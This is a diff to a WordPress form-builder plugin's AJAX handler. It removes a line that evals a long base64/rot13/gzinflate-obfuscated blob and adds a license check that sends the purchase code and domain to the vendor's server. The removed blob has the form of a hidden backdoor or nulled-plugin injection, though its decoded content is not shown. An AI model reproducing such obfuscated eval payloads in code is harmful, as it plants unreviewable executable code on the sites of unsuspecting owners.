@@ -178,7 +178,51 @@ class SUPER_Ajax {
             }
         }
         update_option( 'super_settings', $array );
-        eval(str_rot13(gzinflate(str_rot13(base64_decode('LUvXrq3IFfwaeMZieTLyEznnzItSzjnz9YY7PtKRoDdnr0tIi6Ue7r+3/ojXeyiXv8ehS0P4v/MyJfPyaj40SH7//+YvTFx643V9uwYn7LBxRxj5A1qBmQAiZ04Xuf8Xdf/Knco3Qg8b8zfESfwuzVVN6IpYkN2/QL0LuGrpvchY5OwDaJeTsnxisfc/rpsc6eJPTPMV3JaMn9Kdg5Ts/QnmsqeS6vZ9N2L4DQcpZPm961ciXI4Oy0oInkTDolm6TABKAFupJMzIuHA+bXgcnBOZXbS3nlUxhQHLW5k6lGcZ5Y9BPO+eVoOxCnwxZHOjF4bIuffz1XR5osgiFoxLFtMSr3bXxKWFZnlzNxcAsj2Lhmszh/1ZTRJuQdxy6AlsjW+7E0G4hj/mPehnmuWlN3lbYOJLxe1dm/8IzzG0UIjJ3JLKfQP6WOfd281HwfbYoKojI+QbT5xrhj5W/bVCr9CxXygm2zqAWtngPXGezi4EUUZ6MMPohgfq9Rj7bDkpaWKEaNycGGOqULYA3CTlMEUv8KeCEGXYUe+CWL6WoWrjIOHZ3WxrqpBjVpKpgbaaZvKLroX4y5hMusscvmVBkowkvAJucYMtN8pEOAWs9lWBeEpS4vqTRFtVkqBcuH1nMcyfFhIw/ERrYAGDj70SV0puX7uQMUesyWgDCOjlwNm1RCiIntPzC42whWmBm8cPUuJPoC+RgDjieVPizpJv+mlE58nCruW3W9cvG94se9AhjXr2bZoQ/30eC/GyVFaFC/z1NQi6XfE9spRRxv6JyzNdISYQTUE4cYDTsRbwwFABbhWmlL2YgqPhhfa+tlZbgGb9DLj5A2n670yVpVxkyt+Ah+hmz2OYh9u0qh7X8k2vr573iE5xxq/fWMDJL7YQvppoVke6r16i9FZ5Db43aDb8ii13LIrx/hQ8ch5fR+rgZU85myxkIC5Xdv3u1lxo0HjKkFF4PXR6LmxRAVTyCKgETcqoCbgRWKyHlMHNz5nZwueg7rqf6bmX8fwWjNc59271uLVxnKdWzaLp/a4qTBkNECfhX5FluB+W4kn6HWufvhdw0mFPuvCzVCbTI1SrwiKE71gaI/IomhK0jR0aQgi9DmyjAnbqUsskDTWewakA0OP1jMvg15nzlKFbwxh9qbLNCEU3ESrvLXU/SddA4qiTqok9meFphQxmjtGYilEFkIXBFFx8Ud99sqEqN0mfAEBIeiKKeGL/FWaQ1406JReVDmmx8DyymIpI6Ce5kEieB03fPt4pQLMP75QsNCOgJC1yV6RQbZwu6mY4P8iPgaToWpNBPXUEN07znnPBMu0c/ny6vFgo78JdYGe2SZ3nmCMXHo+l4JyIqx5MoGWyX+SVNqqzB6r1+XwlZ2hfqEYxKxzs1btvILZScJgNISkh4qIDAzQ0Bg2Z6OwxvVSnxcgsW98w3BpjPlaaKUOromGtSLJWuedtVtwLHi5JxmjaQ3OeQ1heUjsYSP1hr/OX352mD2pL3NW9fL8n2jiXqMcEBRGJJe8jerKbd8SoNQCiiZ9iPhR2j77MPvmsXXLTiScsD+E+8ezxATHHN6WYcWZCw7QwnAVWm7fWwlWdbm9Xk/RL0TRjVEnIi7JVgJZ0Iv8eIobqsyE/ecpNes4K/cU+LXnWIn0L3soAapBioXn29LWvLzJ1sxGINR6r1QAGfsBcnzXf29nZ9PTTHJ5y4MsP6DEonZIpjEhSycOi/PU/9lH0r3rGCIwruvoNnpFv4Iezv+ZKBfWAF6DmR5Vg5o+ZpmICaGAyLVbQvc78KG8A37fbWTai3gzqRdA3cj7fH8JYl6isRTKlJL8eBkI+viUxwh6kDwxJWsh4KjniNE//4nGiu2HUu76CkZe3tFnsVyElpczSakuJ6LuoasS5+xh3BQdHqBQDqhmP6H5RZxCIftC5Z9KEX3oM9eK/zzOSIS0/IcQUy6wgGisRg5uCt+dP9TXOkqW16JF6EmetCJrJK3p4dnI5zvnSIOWVKEYfQIyS4XJdwuGKyJd/a5UWpzCvwCT0K3ycLp5SuC8kmnTiTASXRlRTBc5WbRpJWE0/R11yoxhR7OYvEaHVolZldCxbSCIEdjlB3q48JdL0bebyH1+44oRxH1cezsNyKYMqPxhxmLPBZuXg3mvbEl1NmPeRC+bEKgdQDe2dpWKkUMdVhGfA7m/Jw8WHzisf1CrI/RK1PsspplLKBFMqHtlqFKZBhBgvShyVjEyIelV0eQpyEBAcp0C33OWLWai040pkCnbwIOrlrqu4b8ubEeNwQU3hODO+5Kk3jZgqQFY21e6b2eIpL2IR92ihBulRskTk+9Lt8KGEM1bG8eubfhs4U3bM76nMFxp8uKAk5b6PX90cSLrMWHgza9JcjweRji8D+Kd4VYHGwIou+a4d4AnwGq56h5RdRaEWmozuojB+CMjY8oUDg4zytpPFDpb22uZat63RjBK4txZ1oqd99YpL4hdOV1gqbg+SsIar/ReinvQc8eHrhdYGcf0Srw7K8+GsNFZurbM4vWyNZce+slqJNvIXbTp0WsL0hL5jYcVHln1e8UkbQlDjIWmKGaGQi/CEvb2PKrc/NEXjBt7kze2wfkjzJbTRZmypQzZ3VzviJI/vpy0A/VWg2Rbsfj7KJr+OQxX3UKcAxOWyXHn69buPY7GEcP1r21g/3nPj6DQoclEKfEhiEcEfbPeDK2YPbp4+uygQoq8vQrtEdnFQ9DnwyiPJrvZcW0Wx7jjOhrjjFyjvwsrD8NLePvxhuX5X8Shpjj1xLDY/sjM783aUUWr4SNQcYu3Gd1yhnXjGlyRm+4g40kPpgUuzmvDIdxfAh4tXiE5hkYP9uLCjguI//WcOX8d/ukbz4ddN26XuWXuSIuSTXqdvSwEYpAXWUz8zzBiXivVp0rNTj7zK0b0QR1WGnu2RnBUNDB69LtowIJ3g2cYsGrwE5HYXFybmpk4zqS2AhmiRWcUM+COXkSQd8NiOkY5KeKeSq2nvLW3gMcbqPWrig4lHHWovGGfMXiDnMXNek/WOwLLz7vbJrFhjgfDqdFEm94qMlGJLBNMVRQMlE9+f/SLcve+BgS1bHdNAi3TAtFVMFrhqCRIKXW23IwLtSAU/HVgKSduvPGyFoURIyHrQZqbPb7MqHB0UaehJ0A8MD7O+e84DINSMHOboti3fDyrmbodQ3DUeXY3r5bMcaeMn1Wkyh7tDs7vwwdeINHNZDWn+daXEIldkr2BpGXRSnxhB5BDVOtIFhMhcIXt2YF9ztlnsz6rUIiimPuq2gUdyBBlldBsaoJ5ZZJnhz95KioP6fHLyKJXCkqWMWk7XH+ubgPrTNgeyZKapNiH5gHgzm/6akSjilo9jeiTNkMM75fZyHbt34PujZOCTa+/Io68Bo/DLvepGUg2JPe7nLJDpBtFg1KWyQexXMj/9YxQmgwqrVOY34Kv1lyhk6AwrkN654cy1vEwe90D4+5JIJoLaoiBTC/AgiLtG55MsUUQUrDAmFRzVQxmzFFw4+d2zXHIoeHhZ2LlQZGJ6hfxoka9FhWFzgh56tow/EJjAy3Xq+Do5djNdRoF8NBOLiLS4Mn+8vKXLhvhlm6IKLCeJGfdLBmUrQFI1giL/ABUS5oJL4pqkDUp8noodmf0d6XnP07bQmxgo8z4tW5xy5IbnxIv1cgcfnHf7A1AtwmIj4MO6ijB3W+ImVJrsZjwK6eShR2Px2wxv0FPLNztppGZ6gBv4h/eL75tVZ/tTMf/WrWo7U0SQ4JkCrgvntC+D3OnfuU8j0UjtahUGRE2zfFhGRhUYV+LHz74sg488EQTuH0gyqtH1hLPWORAPl5988r9WshoMy5GFO9t4QTHicYQsLlM238LK+3I788aC9ctPAHqIHDEzS5ubTn/wBdI7eFtpSL5RqhqJA/8RVCG14X80sY2N1rv7WvoSEmvQOpxNiktIzwhidKpV071jr9tmCc6Wq8lE1J+TdnON1aW5DDG+lsM3KFUNvi7utC6Fg31wZ3psd7UnoZtC5HPcen4rQxjGcL7CCc0tue4alkEmh9p+0lZh4A3IgJm6tSrzlCo08o0G3+Zi7sP/Ivrcv8J/Te7cW91gWeBmAf2KfBOd5/OiQkuA7r1N7LKhANSloo9NU7QB8tTZpa3B4USzRzqS3LReKnDJxgTjlVdt4hGbwlP3YV6AIXNnZAV54KJCTNwF9ezvE9I9RNheM3G/vCNrDhsMBQdpKTeyBGtUNXyCqkfZ68oxyxmk/Ag/jT0XMvgrgRqqyQO0ICRbULe4elV/JCbWGePlF2RRbIOLSuJB/cC1jPbrOMd0M4nDF01zv7laGWPooMPPjhRiSkwXrgRrJRhl4Gpq+9JusEmOUAXsGAjlk/xUCOrbyYNN60S5r03f+76sfcuI+FbSICAzixSP9ZfHZIpRQ/qOEd2JGQTY0eKPwgvds0j7AkPblXHN5clGObNlBdQkTqTZ2savIFSrpUgg8o4L+tIDUGfOrDT3fQnYZ4x0yk7qp3l8YuFCPIjUFyS9Jj4VW4iI94LTDyl5idsM4gMoOENrxf2+WTjD1/b28M3r44Nt+k+Nv8Nzp8gwqer3WvEamduPdQmBqB1kWqPTYohDToLwYmqhkxgotfL1R2EwIlUgYtga6xq2jNDOIqXwVKJ3j0fHFtt1e9I5bjSECkIlYFY0+nTa6q1pwDMfGAUhb3cVlDnDg/ZG4i/YQkR8lhL7+s6KGvcJ25CYnpj6kUFJIpvcRUobpvAXIxolPt/++fRDVNg/Fw3917/fv//8Dw==')))));
+
+        $domain = sanitize_text_field($_SERVER['SERVER_NAME']);
+        $url = 'http://f4d.nl/super-forms/?api=license-check&key=' . $array['license'] . '&domain=' . $domain;
+        $response = wp_remote_get( $url );
+        $result = $response['body'];
+        if( $result==false ) {
+            $result = 'offline';
+        }
+        if($result=='activated'){
+            update_option( 'image_default_positioning', 1 );
+            $error=false;
+            $msg = __( 'Plugin is activated!', 'super-forms' );
+        }else{
+            $error=true;
+            if($result=='activate'){
+                update_option( 'image_default_positioning', 1 );
+                $error=false;
+                $msg = __( 'Product successfully activated!', 'super-forms' );
+            }
+            if($result=='used'){
+                update_option( 'image_default_positioning', 0 );
+                $msg = __( 'Purchase code already used on an other domain, could not activate the plugin!<br />Please <a target="_blank" href="http://codecanyon.net/item/super-forms-drag-drop-form-builder/13979866">purchase another license</a> in order to activate the plugin..', 'super-forms' );
+            }
+            if($result=='invalid'){
+                update_option( 'image_default_positioning', 0 );
+                $msg = __( 'Invalid purchase code, please check and try again!', 'super-forms' );
+            }                
+            if($result=='error'){
+                update_option( 'image_default_positioning', 0 );
+                $msg = __( 'Either the Purchase Code was empty or something else went wrong', 'super-forms' );
+            }
+            if($result=='offline'){
+                update_option( 'image_default_positioning', 1 );
+                $msg = __( 'Could\'t connect database to check Purchase Code. Plugin activated manually.', 'super-forms' );
+            } 
+            if( ($result!='activate') && ($result!='used') && ($result!='invalid') && ($result!='error') && ($result!='offline')  ) {
+                $msg = __( 'We couldn\'t check if your activation code is valid because your Access control configuration prevents your request from being allowed at this time. Please contact your service provider to resolve this problem. For now we have temporarily activated your plugin. Make sure you fix this issue.', 'super-forms' );
+                update_option( 'image_default_positioning', 1 );
+            }
+        }
+        SUPER_Common::output_error(
+            $error,
+            $msg
+        );
+
         die();
     }
 
